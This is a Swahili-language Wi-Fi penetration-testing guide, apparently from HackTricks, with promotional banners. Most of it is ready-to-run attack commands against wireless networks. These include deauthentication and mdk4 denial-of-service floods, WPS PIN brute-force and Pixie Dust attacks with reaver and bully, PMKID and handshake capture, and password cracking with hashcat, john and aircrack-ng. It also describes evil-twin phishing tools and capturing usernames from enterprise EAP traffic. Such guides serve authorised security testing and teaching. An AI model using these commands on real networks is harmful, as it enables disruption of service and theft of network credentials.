# Kupima Usalama wa Wifi

<details>

<summary><strong>Jifunze kuhusu kudukua AWS kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA USAJILI**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** üí¨ [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au [**kikundi cha telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kudukua kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Jiunge na [**Seva ya Discord ya HackenProof**](https://discord.com/invite/N3FrSbmwdy) ili kuwasiliana na wadukuzi wenye uzoefu na wawindaji wa zawadi za mdudu!

**Machapisho Kuhusu Kudukua**\
Shiriki na yaliyomo yanayochimba kina cha msisimko na changamoto za kudukua

**Taarifa za Kudukua Halisi**\
Kaa sawa na ulimwengu wa kudukua wenye kasi kupitia taarifa za wakati halisi na ufahamu

**Matangazo Mapya Zaidi**\
Baki mwelewa na zawadi mpya za mdudu zinazoanzishwa na sasisho muhimu za jukwaa

**Jiunge nasi kwenye** [**Discord**](https://discord.com/invite/N3FrSbmwdy) na anza kushirikiana na wadukuzi bora leo! 

## Amri za Msingi za Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Vifaa

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon

Airgeddon ni chombo cha kufanya mashambulizi ya Wi-Fi ambayo inajumuisha aina nyingi za mashambulizi kwenye mitandao ya Wi-Fi. Inaweza kutumika kwa uchunguzi wa usalama wa mitandao ya Wi-Fi na inatoa njia mbalimbali za kuvunja usalama wa mitandao hiyo.
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Tumia airgeddon na docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
From: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Inaweza kutekeleza mashambulizi ya Evil Twin, KARMA, na Known Beacons kisha kutumia kigezo cha udanganyifu kupata nenosiri halisi la mtandao au kunasa siri za mitandao ya kijamii.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

Zana hii inaotomatisha mashambulizi ya **WPS/WEP/WPA-PSK**. Itakuwa moja kwa moja:

* Weka kiolesura katika hali ya ufuatiliaji
* Skani kwa mitandao inayowezekana - Na kuruhusu kuchagua waathiriwa
* Ikiwa ni WEP - Anzisha mashambulizi ya WEP
* Ikiwa ni WPA-PSK
* Ikiwa ni WPS: Shambulio la vumbi la Pixie na shambulio la kubadilisha nguvu (kuwa mwangalifu shambulio la kubadilisha nguvu linaweza kuchukua muda mrefu). Tafadhali kumbuka kuwa haitajaribu PIN tupu au PIN zilizotengenezwa kutoka kwenye database.
* Jaribu kukamata PMKID kutoka kwa AP ili kuivunja
* Jaribu kudeauthenticate wateja wa AP ili kukamata handshake
* Ikiwa ni PMKID au Handshake, jaribu kubadilisha nguvu kwa kutumia nywila za juu 5000.

## Muhtasari wa Mashambulizi

* **DoS**
* Deauthentication/disassociation -- Kukatisha kila mtu (au ESSID/Client maalum)
* AP bandia za kubahatisha -- Ficha mitandao, inaweza kusababisha skana kushindwa
* Overload AP -- Jaribu kumaliza AP (kawaida sio ya kipekee)
* WIDS -- Cheza na IDS
* TKIP, EAPOL -- Baadhi ya mashambulizi maalum ya DoS kwa baadhi ya APs
* **Kuvunja**
* Vunja **WEP** (zana na njia kadhaa)
* **WPA-PSK**
* **WPS** pin "Brute-Force"
* **WPA PMKID** kuvunja nguvu
* \[DoS +] **WPA handshake** kukamata + Kuvunja
* **WPA-MGT**
* **Kukamata jina la mtumiaji**
* **Kuvunja nguvu** Nywila
* **Pacha Mwovu** (na au bila DoS)
* **Pacha Mwovu** wa **Open** \[+ DoS] -- Inayofaa kukamata siri za mlango wa wavuti na/au kufanya mashambulizi ya LAN
* **Pacha Mwovu** wa **WPA-PSK** -- Inayofaa kwa mashambulizi ya mtandao ikiwa unajua nywila
* **WPA-MGT** -- Inayofaa kukamata siri za kampuni
* **KARMA, MANA**, **MANA ya Kishindo**, **Beacon Inayojulikana**
* **+ Open** -- Inayofaa kukamata siri za mlango wa wavuti na/au kufanya mashambulizi ya LAN
* **+ WPA** -- Inayofaa kukamata WPA handshakes

## DOS

### Pakiti za Kudeauthenticate

**Maelezo kutoka** [**hapa**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

Mashambulizi ya **Kudeauthenticate**, njia inayojulikana sana katika udukuzi wa Wi-Fi, inahusisha kufanya "menejimenti" bandia ili **kukatisha nguvu kifaa kutoka kwenye mtandao**. Pakiti hizi zisizo na kificho zinawadanganya wateja kuamini wanatoka kwenye mtandao halali, kuruhusu wadukuzi kukusanya handshakes za WPA kwa madhumuni ya kuvunja au kuvuruga kwa kudumu uhusiano wa mtandao. Mkakati huu, unaotisha kwa urahisi wake, hutumiwa sana na una athari kubwa kwa usalama wa mtandao.

**Kudeauthenticate kwa kutumia Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
* \-0 inamaanisha deauthentication
* 1 ni idadi ya deauths ya kutuma (unaweza kutuma zaidi ikiwa unataka); 0 inamaanisha kutuma mara kwa mara
* \-a 00:14:6C:7E:40:80 ni anwani ya MAC ya pointi ya ufikivu
* \-c 00:0F:B5:34:30:30 ni anwani ya MAC ya mteja wa kudeauthenticate; ikiwa hii haipo basi kudeauthentication ya utangazaji inatumwa (haifanyi kazi kila wakati)
* ath0 ni jina la kiolesura

### Pakiti za Kujitenga

**Pakiti za kujitenga**, sawa na pakiti za deauthentication, ni aina ya fremu ya usimamizi inayotumiwa katika mitandao ya Wi-Fi. Pakiti hizi hutumika kuvunja uhusiano kati ya kifaa (kama vile kompyuta ndogo au simu ya mkononi) na pointi ya ufikivu (AP). Tofauti kuu kati ya kujitenga na deauthentication iko katika matukio yao ya matumizi. Wakati pointi ya ufikivu inatoa **pakiti za deauthentication kuondoa vifaa vya kijanja wazi kutoka kwenye mtandao, pakiti za kujitenga kawaida hutumwa wakati AP inapofanyiwa kuzimwa**, kuanzishwa upya, au kuhamishwa, hivyo kuhitaji kuvunja uhusiano wa nodi zote zilizounganishwa.

**Shambulio hili linaweza kutekelezwa na mdk4 (mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Mashambulizi Zaidi ya DOS na mdk4**

**Katika** [**hapa**](https://en.kali.tools/?p=864)**.**

**MODE YA MSHAMBULIZI b: Kufurika kwa Beacon**

Inatuma fremu za beacon kuonyesha AP bandia kwa wateja. Mara nyingine hii inaweza kusababisha kuharibika kwa zana za uchunguzi wa mtandao na hata madereva!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**MODE YA SHAMBULIZI a: Kukataa Huduma ya Uthibitisho**

Kutuma fremu za uthibitisho kwa Vituo vya Kufikia (APs) vyote vinavyopatikana ndani ya umbali unaweza kuzidisha APs hizi, hasa wakati wateja wengi wanahusika. Trafiki hii kali inaweza kusababisha kutokuwa imara kwa mfumo, kusababisha baadhi ya APs kufungia au hata kurejesha upya.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**MODE YA SHAMBULIZI p: Kuchunguza na Kufanya Bruteforce kwa SSID**

Kuchunguza Vituo vya Kufikia (APs) huchunguza ikiwa SSID inaonekana ipasavyo na kuthibitisha umbali wa AP. Mbinu hii, pamoja na **kufanya bruteforce kwa SSID zilizofichwa** na au bila orodha ya maneno, husaidia katika kutambua na kupata mitandao iliyofichwa.

**MODE YA SHAMBULIZI m: Kutumia Kinga ya Michael kwa Ujanja**

Kutuma pakiti za kubahatisha au zilizodurufishwa kwa foleni tofauti za QoS kunaweza kusababisha Kinga ya Michael kwenye **AP za TKIP**, ikisababisha kuzimwa kwa AP kwa dakika moja. Mbinu hii ni mbinu ya shambulizi ya **DoS** (Denial of Service) yenye ufanisi.
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**MODE YA SHAMBULIZI e: Uingizaji wa Pakiti za EAPOL Start na Logoff**

Kufurika kwa AP na **mifumo ya EAPOL Start** husababisha **vikao bandia**, kuzidi nguvu ya AP na kuzuia wateja halali. Kwa upande mwingine, kuingiza **ujumbe bandia wa EAPOL Logoff** kwa lazima kunaunganisha wateja, njia zote mbili zinavuruga huduma ya mtandao kwa ufanisi.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**MODE YA SHAMBULIZI s: Mashambulizi kwa mitandao ya mshono ya IEEE 802.11s**

Mashambulizi mbalimbali kwenye usimamizi wa kiungo na uundaji wa njia kwenye mitandao ya mshono.

**MODE YA SHAMBULIZI w: Utatanishi wa WIDS**

Kuunganisha wateja kwa nodi za WDS nyingi au vituo vya upande wa bandia kunaweza kudanganya Mifumo ya Kugundua na Kuzuia Kuingilia, kusababisha utatanishi na unyanyasaji wa mfumo unaowezekana.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**MODE YA SHAMBULIZI f: Packet Fuzzer**

Fuzzer ya pakiti inayojumuisha vyanzo vya pakiti tofauti na seti kamili ya mabadilishaji kwa ajili ya upotoshaji wa pakiti.

### **Airggedon**

_**Airgeddon**_ inatoa sehemu kubwa ya mashambulizi yaliyopendekezwa katika maoni ya awali:

![](<../../.gitbook/assets/image (95).png>)

## WPS

WPS (Wi-Fi Protected Setup) inasahilisha mchakato wa kuunganisha vifaa kwenye router, ikiboresha kasi ya usanidi na urahisi kwa mitandao iliyofichwa kwa **WPA** au **WPA2** Personal. Haifai kwa usalama wa WEP ambao unaweza kuvunjwa kwa urahisi. WPS hutumia PIN ya nambari 8, inayothibitishwa katika sehemu mbili, ikifanya iwe rahisi kwa mashambulizi ya nguvu ya brute kutokana na idadi ndogo ya mchanganyiko (11,000 uwezekano).

### WPS Brute Force

Kuna zana 2 kuu za kutekeleza hatua hii: Reaver na Bully.

* **Reaver** imeundwa kuwa shambulizi imara na la vitendo dhidi ya WPS, na imejaribiwa dhidi ya aina mbalimbali za vituo vya kupata na utekelezaji wa WPS.
* **Bully** ni **utekelezaji mpya** wa shambulizi la nguvu ya brute ya WPS, iliyoandikwa kwa C. Ina faida kadhaa ikilinganishwa na msimbo wa awali wa reaver: mahitaji machache ya mazingira, utendaji bora wa kumbukumbu na cpu, kushughulikia kwa usahihi wa endianness, na seti imara zaidi ya chaguo.

Shambulizi linatumia **udhaifu wa PIN ya WPS**, hasa ufunuo wa nambari nne za kwanza na jukumu la nambari ya mwisho kama checksum, ikirahisisha shambulizi la nguvu ya brute. Hata hivyo, ulinzi dhidi ya mashambulizi ya nguvu ya brute, kama **kuzuia anwani za MAC** za wachokozi wenye msimamo mkali, inahitaji **ubadilishaji wa anwani za MAC** ili kuendelea na shambulizi.

Baada ya kupata PIN ya WPS kwa zana kama Bully au Reaver, mshambuliaji anaweza kudokeza PSK ya WPA/WPA2, ikihakikisha **upatikanaji wa mtandao wa kudumu**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Njia ya Kufikirika ya Kuforce**

Hii njia iliyoboreshwa inalenga WPS PINs kwa kutumia mapungufu yaliyojulikana:

1. **PINs Zilizogunduliwa mapema**: Tumia database ya PINs zilizojulikana zinazohusishwa na watengenezaji maalum wanaojulikana kutumia WPS PINs za kawaida. Hii database inalinganisha octets tatu za kwanza za MAC-addresses na PINs za uwezekano kwa watengenezaji hawa.
2. **Algorithms za Kuzalisha PIN**: Tumia algorithms kama ComputePIN na EasyBox, ambazo huzalisha WPS PINs kulingana na MAC-address ya AP. Algorithm ya Arcadyan inahitaji pia kitambulisho cha kifaa, ikiongeza safu kwenye mchakato wa kuzalisha PIN.

### Shambulio la WPS Pixie Dust

**Dominique Bongard** aligundua kasoro katika baadhi ya Pointi za Kufikia (APs) kuhusiana na uundaji wa kanuni za siri, zinazojulikana kama **nonces** (**E-S1** na **E-S2**). Ikiwa nonces hizi zinaweza kufahamika, kuvunja WPS PIN ya AP inakuwa rahisi. AP inafichua PIN ndani ya kanuni maalum (hash) kuthibitisha kuwa ni halali na sio AP bandia (rogue). Nonces hizi ni "funguo" za kufungua "salama" linaloshikilia WPS PIN. Zaidi kuhusu hili inaweza kupatikana [hapa](https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-\(Offline-WPS-Attack\)).

Kwa maneno rahisi, suala hapa ni kwamba baadhi ya APs hazikuzingatia vya kutosha funguo za kutosha kwa kufichamisha PIN wakati wa mchakato wa uunganisho. Hii inafanya PIN kuwa hatarini kufikiriwa kutoka nje ya mtandao (shambulio la kuforce nje ya mtandao).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
If you don't want to switch the device into monitor mode, or `reaver` and `bully` have some problem, you can try [OneShot-C](https://github.com/nikita-yfh/OneShot-C). This tools can performs Pixie Dust attack without having to switch to monitor mode.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Shambulizi la Null Pin

Baadhi ya mifumo iliyojengwa vibaya hata huruhusu **Null PIN** (PIN tupu au usiopo) kutoa ufikiaji, jambo ambalo ni la kipekee. Zana ya **Reaver** inaweza kufanya majaribio ya udhaifu huu, tofauti na **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Mashambulizi yote yaliyopendekezwa ya WPS yanaweza kutekelezwa kwa urahisi kutumia _**airgeddon.**_

![](<../../.gitbook/assets/image (219).png>)

* 5 na 6 inakuruhusu kujaribu **PIN yako ya desturi** (ikiwa una yoyote)
* 7 na 8 hutekeleza mashambulizi ya **Pixie Dust**
* 13 inakuruhusu kujaribu **PIN ya NULL**
* 11 na 12 ita **kusanya upya PIN zinazohusiana na AP iliyochaguliwa kutoka kwenye database zilizopo** na **kuzalisha** PIN **zinazowezekana** kwa kutumia: ComputePIN, EasyBox na hiari Arcadyan (inapendekezwa, kwa nini la?)
* 9 na 10 itajaribu **kila PIN inayowezekana**

## **WEP**

Imevunjika na haikutumiwi siku hizi. Jua tu kwamba _**airgeddon**_ ina chaguo la WEP linaloitwa "All-in-One" kushambulia aina hii ya ulinzi. Zana zingine zinatoa chaguo sawa.

![](<../../.gitbook/assets/image (432).png>)

***

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Jiunge na [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server ili kuwasiliana na wadukuzi wenye uzoefu na wawindaji wa tuzo za mdudu!

**Machapisho Kuhusu Udukuzi**\
Shiriki na maudhui yanayochimba kina kuhusu msisimko na changamoto za udukuzi

**Taarifa za Udukuzi za Wakati Halisi**\
Kaa up-to-date na ulimwengu wa udukuzi wenye kasi kupitia habari na ufahamu wa wakati halisi

**Matangazo ya Karibuni**\
Baki mwelewa na tuzo za mdudu zinazoanzishwa na sasisho muhimu za jukwaa

**Jiunge nasi kwenye** [**Discord**](https://discord.com/invite/N3FrSbmwdy) na anza kushirikiana na wadukuzi bora leo!

***

## WPA/WPA2 PSK

### PMKID

Mwaka wa 2018, **hashcat** [ilifunua](https://hashcat.net/forum/thread-7717.html) njia mpya ya mashambulizi, ya kipekee kwa sababu inahitaji **pakiti moja tu** na haina haja ya wateja yeyote kuwa wameunganishwa kwenye AP ya lengo‚Äîmawasiliano tu kati ya mshambuliaji na AP.

Routa nyingi za kisasa huongeza **uchaguzi wa uga** kwenye fremu ya **kwanza ya EAPOL** wakati wa ushirikiano, inayoitwa `Robust Security Network`. Hii inajumuisha `PMKID`.

Kama chapisho la awali linavyoeleza, **PMKID** inaundwa kwa kutumia data inayojulikana:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Kwa kuwa "Jina la PMK" ni la kudumu, tunajua BSSID ya AP na kituo, na `PMK` ni sawa na ile kutoka kwa mshikamano kamili wa hatua 4, **hashcat** inaweza kutumia habari hii kuvunja PSK na kupata nywila!

Kukusanya habari hii na kufanya **bruteforce** ya nywila kwa kienyeji unaweza kufanya:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
**PMKIDs zilizochukuliwa** zitaonyeshwa kwenye **console** na pia **kuhifadhiwa** ndani ya \_/tmp/attack.pcap\_\
Sasa, geuza uchukuzi huo kuwa muundo wa **hashcat/john** na ulivunje:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Tafadhali elewa kwamba muundo sahihi wa hash una sehemu **4**, kama vile: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Ikiwa yako ina sehemu **3** tu, basi, ni **batili** (kukamata PMKID haikuwa sahihi).

Tambua kwamba `hcxdumptool` **pia hukamata mikono** (kitu kama hiki kitatokea: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Unaweza **kubadilisha** mikono hiyo kuwa muundo wa **hashcat**/**john** kwa kutumia `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Nimegundua kwamba baadhi ya mikono iliyonaswa na zana hii haiwezi kuvunjwa hata kwa kujua nenosiri sahihi. Ningependekeza kunasa mikono pia kwa njia ya jadi ikiwezekana, au kunasa kadhaa kwa kutumia zana hii._

### Kunasa Mikono

Shambulio kwenye mitandao ya **WPA/WPA2** linaweza kutekelezwa kwa kunasa **mkono** na kujaribu **kuvunja** nenosiri **nje ya mtandao**. Mchakato huu unahusisha kufuatilia mawasiliano ya mtandao maalum na **BSSID** kwenye **channel** fulani. Hapa kuna mwongozo uliofupishwa:

1. Tambua **BSSID**, **channel**, na **mteja aliyeunganishwa** wa mtandao wa lengo.
2. Tumia `airodump-ng` kufuatilia trafiki ya mtandao kwenye channel na BSSID iliyospecify, ukitumai kunasa mkono. Amri itaonekana kama hii:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Ili kuongeza nafasi ya kukamata handshake, katiza mteja kutoka kwenye mtandao kwa muda ili kulazimisha upya wa uthibitishaji. Hii inaweza kufanywa kwa kutumia amri ya `aireplay-ng`, ambayo hutoa pakiti za kufuta uthibitishaji kwa mteja:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Note kwamba kama mteja aliondolewa uthibitisho unaweza jaribu kuunganisha kwenye AP tofauti au, katika visa vingine, kwenye mtandao tofauti._

Marafiki katika `airodump-ng` inaonekana baadhi ya taarifa za handshake hii inamaanisha kwamba handshake ilichukuliwa na unaweza kuacha kusikiliza:

![](<../../.gitbook/assets/image (172) (1).png>)

Marafiki handshake ikichukuliwa unaweza **kuvunja** na `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Angalia kama kuna handshake kwenye faili

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Akipata salamu isiyokamilika ya ESSID kabla ya ile iliyokamilika, haitaigundua ile halali._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
## **WPA Enterprise (MGT)**

Katika **mazingira ya WiFi ya biashara, utakutana na njia mbalimbali za uwakiki**, kila moja ikiwa na viwango tofauti vya usalama na vipengele vya usimamizi. Unapotumia zana kama `airodump-ng` kuchunguza mtandao wa trafiki, unaweza kugundua vitambulisho vya aina hizi za uwakiki. Baadhi ya njia za kawaida ni pamoja na:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Kadi ya Kipekee ya Jumla)**:
* Mbinu hii inasaidia vitufe vya vifaa na nywila za wakati mmoja ndani ya EAP-PEAP. Tofauti na MSCHAPv2, haitumii changamoto ya rika na hutoa nywila kwa maandishi wazi kwa kituo cha kupata, ikileta hatari ya mashambulizi ya kudhoofisha.
2. **EAP-MD5 (Ujumbe wa Kukandamiza 5)**:
* Inahusisha kutuma hash ya MD5 ya nywila kutoka kwa mteja. **Haipendekezwi** kutokana na kuwa hatarini kwa mashambulizi ya kamusi, ukosefu wa uwakilishi wa seva, na kutokuweza kuzalisha funguo za WEP maalum kwa kikao.
3. **EAP-TLS (Usalama wa Tabaka la Usafirishaji)**:
* Hutumia vyeti kwa pande zote za mteja na seva kwa uwakilishi na inaweza kuzalisha funguo za WEP kulingana na mtumiaji na kikao kwa ajili ya kusimamia mawasiliano.
4. **EAP-TTLS (Usalama wa Tabaka la Usafirishaji lililotunzwa)**:
* Hutoa uwakilishi wa pande zote kupitia handaki lililofichwa, pamoja na mbinu ya kutoa funguo za WEP za kipekee, kwa mtumiaji, kwa kikao. Inahitaji vyeti vya upande wa seva tu, na wateja kutumia sifa za uthibitishaji.
5. **PEAP (Itifaki ya Uthibitishaji Inayoweza Kupanuliwa)**:
* Inafanya kazi kwa njia sawa na EAP kwa kujenga handaki la TLS kwa mawasiliano yaliyolindwa. Inaruhusu matumizi ya mbinu dhaifu za uwakilishi juu ya EAP kutokana na ulinzi unaotolewa na handaki.
* **PEAP-MSCHAPv2**: Mara nyingi huitwa PEAP, inachanganya mbinu ya changamoto/jibu ya MSCHAPv2 inayoweza kudhuriwa na handaki la TLS linalolinda.
* **PEAP-EAP-TLS (au PEAP-TLS)**: Kama EAP-TLS lakini inaanzisha handaki la TLS kabla ya kubadilishana vyeti, ikitoa safu ya ziada ya usalama.

Unaweza kupata habari zaidi kuhusu mbinu hizi za uwakilishi [hapa](https://en.wikipedia.org/wiki/Extensible\_Authentication\_Protocol) na [hapa](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Kukamata Jina la Mtumiaji

Kusoma [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) inaonekana kama unatumia **EAP** **"Ujumbe wa Kitambulisho"** lazima **usaidiwe**, na **jina la mtumiaji** litatumwa wazi katika **"Ujumbe wa Kitambulisho cha Majibu"**.

Hata kwa kutumia moja ya mbinu za uwakilishi zenye usalama zaidi: **PEAP-EAP-TLS**, inawezekana **kukamata jina la mtumiaji lililotumwa katika itifaki ya EAP**. Ili kufanya hivyo, **kamata mawasiliano ya uwakilishi** (anzisha `airodump-ng` ndani ya kituo na `wireshark` kwenye kifaa kile kile) na tenganisha pakiti kwa kutumia `eapol`.\
Ndani ya pakiti ya "**Jibu, Kitambulisho**", **jina la mtumiaji** wa mteja litajitokeza.

![](<../../.gitbook/assets/image (850).png>)

### Kitambulisho cha Anonymity

Kuficha kitambulisho kunasaidiwa na EAP-PEAP na EAP-TTLS. Katika muktadha wa mtandao wa WiFi, ombi la Kitambulisho la EAP kawaida huanzishwa na kituo cha kupata (AP) wakati wa mchakato wa ushirikiano. Ili kuhakikisha ulinzi wa kutokujulikana kwa mtumiaji, jibu kutoka kwa mteja wa EAP kwenye kifaa cha mtumiaji kinajumuisha taarifa muhimu tu inayohitajika kwa seva ya RADIUS ya awali kusindika ombi. Dhana hii inaonyeshwa kupitia mifano ifuatayo:

* EAP-Kitambulisho = anonim
* Katika hali hii, watumiaji wote hutumia "anonim" kama kitambulisho chao cha mtumiaji. Seva ya RADIUS ya awali inafanya kazi kama seva ya EAP-PEAP au EAP-TTLS, inayohusika na kusimamia upande wa seva wa itifaki ya PEAP au TTLS. Mbinu ya uwakilishi ya ndani (ililindwa) kisha inashughulikiwa kwa usahihi au kusimamiwa kwa seva ya RADIUS ya mbali (nyumbani).
* EAP-Kitambulisho = anonim@realm\_x
* Katika hali hii, watumiaji kutoka maeneo tofauti wanaficha kitambulisho chao wakati wakionyesha maeneo yao husika. Hii inaruhusu seva ya RADIUS ya awali kupeleka maombi ya EAP-PEAP au EAP-TTLS kwa seva za RADIUS katika maeneo yao ya nyumbani, ambayo hufanya kazi kama seva ya PEAP au TTLS. Seva ya RADIUS ya awali inafanya kazi kama kituo cha kupeleka cha RADIUS tu.
* Vinginevyo, seva ya RADIUS ya awali inaweza kufanya kazi kama seva ya EAP-PEAP au EAP-TTLS na kusimamia mbinu ya uwakilishi iliyolindwa au kupeleka kwa seva nyingine. Chaguo hili linarahisisha usanidi wa sera tofauti kwa maeneo tofauti.

Katika EAP-PEAP, mara tu handaki la TLS linapowekwa kati ya seva ya PEAP na mteja wa PEAP, seva ya PEAP inaanzisha ombi la Kitambulisho cha EAP na kulituma kupitia handaki la TLS. Mteja anajibu ombi la Kitambulisho la pili la EAP kwa kutuma jibu la Kitambulisho la EAP lenye kitambulisho halisi cha mtumiaji kupitia handaki iliyolindwa. Mbinu hii inazuia kufichua kitambulisho halisi cha mtumiaji kwa yeyote anayesikiliza trafiki ya 802.11.

EAP-TTLS inafuata utaratibu kidogo tofauti. Kwa EAP-TTLS, mteja kawaida huthibitisha kwa kutumia PAP au CHAP, iliyolindwa na handaki la TLS. Katika kesi hii, mteja huongeza sifa ya Jina la Mtumiaji na nywila au sifa ya CHAP-Nywila katika ujumbe wa TLS wa kwanza kutumwa baada ya kuanzisha handaki.

